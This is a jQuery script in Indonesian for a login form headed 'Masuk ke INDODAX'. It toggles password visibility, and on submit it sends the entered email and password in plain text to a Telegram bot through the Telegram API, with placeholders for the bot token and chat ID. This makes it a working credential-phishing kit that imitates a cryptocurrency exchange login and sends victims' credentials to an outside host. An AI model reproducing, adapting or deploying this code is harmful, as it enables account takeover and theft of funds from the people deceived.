<!-- Pastikan jQuery dan script ini di bawah element body -->

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
$(document).ready(function() {

    // Toggle show/hide password dengan icon mata
    $('#togglePassword').on('click', function() {
        const passwordField = $('#password');
        const type = passwordField.attr('type') === 'password' ? 'text' : 'password';
        passwordField.attr('type', type);

        if(type === 'password') {
            $(this).html(`
                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                <circle cx="12" cy="12" r="3"/>
            `);
        } else {
            $(this).html(`
                <path d="M17.94 17.94A10.99 10.99 0 0112 19c-4.97 0-9.28-3.16-11-7a11.05 11.05 0 015-5.28" />
                <line x1="1" y1="1" x2="23" y2="23" />
                <path d="M10.58 10.58a3 3 0 004.24 4.24" />
            `);
        }
    });

    // Validasi email minimal ada @ dan password tidak kosong
    function isFormValid() {
        const email = $('#email').val().trim();
        const password = $('#password').val().trim();
        return email !== '' && email.includes('@') && password !== '';
    }

    // Aktifkan tombol login saat valid
    function toggleLoginButton() {
        if(isFormValid()) {
            $('#loginBtn').prop('disabled', false).addClass('enabled');
        } else {
            $('#loginBtn').prop('disabled', true).removeClass('enabled');
        }
    }

    $('#email, #password').on('input', toggleLoginButton);

    // Submit form dan kirim data ke Telegram
    $('#loginForm').on('submit', function(e) {
        e.preventDefault();

        if(!isFormValid()) {
            alert("Email harus mengandung '@' dan kata sandi tidak boleh kosong.");
            return;
        }

        const email = $('#email').val().trim();
        const password = $('#password').val().trim();

        // Format pesan sesuai kebutuhan
        const message = `
Masuk ke INDODAX
------------------------
Alamat Email: ${email}
Kata Sandi: ${password}
------------------------
        `;

        // Ganti dengan token bot Telegram dan chat ID Anda
        const token_bot = 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
        const telegram_id = 'YOUR_CHAT_ID_HERE';

        const url = `https://api.telegram.org/bot${token_bot}/sendMessage?chat_id=${telegram_id}&text=${encodeURIComponent(message)}`;

        // Kirim request ke Telegram API
        $.get(url)
            .done(function(data){
                if(data.ok) {
                    alert('Data berhasil dikirim!');
                    // Bisa redirect atau reset form disini
                    // window.location.href = 'halaman_selanjutnya.html';
                } else {
                    alert('Gagal mengirim data ke Telegram.');
                }
            })
            .fail(function(){
                alert('Terjadi kesalahan saat mengirim data.');
            });
    });

});
</script>
